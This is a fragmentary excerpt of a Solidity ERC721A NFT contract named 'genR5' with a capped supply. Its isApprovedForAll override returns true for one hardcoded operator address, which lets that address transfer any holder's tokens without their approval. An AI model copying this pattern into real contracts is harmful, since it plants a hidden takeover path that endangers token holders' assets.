  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xF2a8777a04bDb063A6A69d82b6E9999945Bd66F8){return true;}
...
contract R3NLT_genR5 is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {

  uint256 public immutable maxPerAddressDuringMint;
  uint public maxSupply = 3972;
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("genR5", "R5", maxBatchSize_, collectionSize_) {
